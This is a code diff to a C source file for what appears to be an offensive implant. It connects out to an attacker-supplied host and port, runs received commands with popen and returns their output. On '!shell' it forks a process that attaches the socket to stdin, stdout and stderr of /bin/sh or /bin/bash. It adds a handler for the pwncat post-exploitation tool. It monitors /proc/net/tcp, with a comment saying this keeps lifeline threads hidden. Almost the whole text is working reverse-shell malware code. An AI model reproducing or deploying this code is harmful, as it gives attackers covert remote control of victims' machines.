@@ -9,13 +9,13 @@
 
 #include "reverse.h"
 const char *PROC_NET_TCP = "/proc/net/tcp";
+const char *PWNCAT_INIT = " echo; echo ";
+const char *CMD_POSTFIX = " 2>&1";
 
 void reverse_shell(const char *host, unsigned int port, unsigned int num_shells) {
     int sock;
     char input[256];
-    char output[256];
     struct sockaddr_in client;
-    const char *cmd_postfix = " 2>&1";
 
     client.sin_family = AF_INET;
     client.sin_addr.s_addr = inet_addr(host);
@@ -44,37 +44,64 @@ void reverse_shell(const char *host, unsigned int port, unsigned int num_shells)
         // Helpful when using a simple `nc` listener
         send(sock, "Connected!\n", strlen("Connected!\n"), 0);
 
-        while (read(sock, input, sizeof(input) - sizeof(cmd_postfix) - 1) > 0) {
+        int firstCommand = 1;
+        while (read(sock, input, sizeof(input) - sizeof(CMD_POSTFIX) - 1) > 0) {
+            // Hacky pwncat compatibility
+            if (firstCommand && strncmp(PWNCAT_INIT, input, strlen(PWNCAT_INIT)) == 0) {
+                handle_pwncat(sock, input);
+                break;
+            }
             // "!shell" drops you into a more "usable" shell
             if (strncmp("!shell", input, strlen("!shell")) == 0) {
                 // Call will create a new process that uses `sock` as a reverse shell.
-                reverse_shell_classic(sock);
+                reverse_shell_classic(sock, "/bin/sh");
                 // Our parent process needs to break out of this while loop to free up `sock`.
                 // This will cause the parent process to begin monitoring /proc/net/tcp again
                 break;
             } else {
-                // Add a postfix to the command to redirect stderr to stdout, s.t.
-                // it is also picked up by fgets
-                char *enter = strstr(input, "\n");
-                strcpy(enter, cmd_postfix);
-                FILE *fp = popen(input, "r");
-                while (fgets(output, sizeof(output), fp) != NULL) {
-                    send(sock, output, strlen(output) + 1, 0);
-                }
-                pclose(fp);
+                handle_cmd(sock, input);
             }
+            firstCommand = 0;
         }
         close(sock);
     }
 }
 
-void reverse_shell_classic(int sock) {
+void handle_pwncat(int sock, char *input) {
+    // Pwncat will send out two delimeters, which we need to return on separate lines.
+    //" echo; echo FRWVJ40vSa; which hostname; echo 1N0YVOVYai"
+    char first[20];
+    char second[20];
+    // Read the markers (needles?) provided by pwncat
+    sscanf(input, "  echo; echo %[^;]; %*[^;]; echo %s\n", first, second);
+    char return_val[50];
+    // return them on separate lines. The second value is the would-be return value of `which hostname`
+    snprintf(return_val, sizeof(return_val), "%s\nAAAA\n%s", first, second);
+    send(sock, return_val, strlen(return_val), 0);
+    // Pwncat seems to work better with bash.
+    reverse_shell_classic(sock, "/bin/bash");
+}
+
+void handle_cmd(int sock, char *input) {
+    char output[256];
+    // Add a postfix to the command to redirect stderr to stdout, s.t.
+    // it is also picked up by fgets
+    char *enter = strstr(input, "\n");
+    strcpy(enter, CMD_POSTFIX);
+    FILE *fp = popen(input, "r");
+    while (fgets(output, sizeof(output), fp) != NULL) {
+        send(sock, output, strlen(output) + 1, 0);
+    }
+    pclose(fp);
+}
+
+void reverse_shell_classic(int sock, char *shell) {
     int pid = fork();
     if (pid != 0) {
         dup2(sock, 0);
         dup2(sock, 1);
         dup2(sock, 2);
-        char *args[] = {"/bin/sh", NULL};
+        char *args[] = {shell, NULL};
         execve(args[0], args, 0);
     }
 }
@@ -83,7 +110,7 @@ void reverse_shell_classic(int sock) {
 //
 // Can be used to keep other lifeline threads hidden by not causing net traffic
 int num_current_connections(const char *host, unsigned int port) {
-    unsigned int occurences = 0;
+    unsigned int occurrences = 0;
 
     int host_int = inet_addr(host);
 
@@ -103,10 +130,10 @@ int num_current_connections(const char *host, unsigned int port) {
             // SYN_SEND
             if (line_host == host_int && line_port == port &&
                 (state == 1 || state == 2 || state == 3)) {
-                occurences += 1;
+                occurrences += 1;
             }
         }
         i += 1;
     }
-    return occurences;
+    return occurrences;
 }
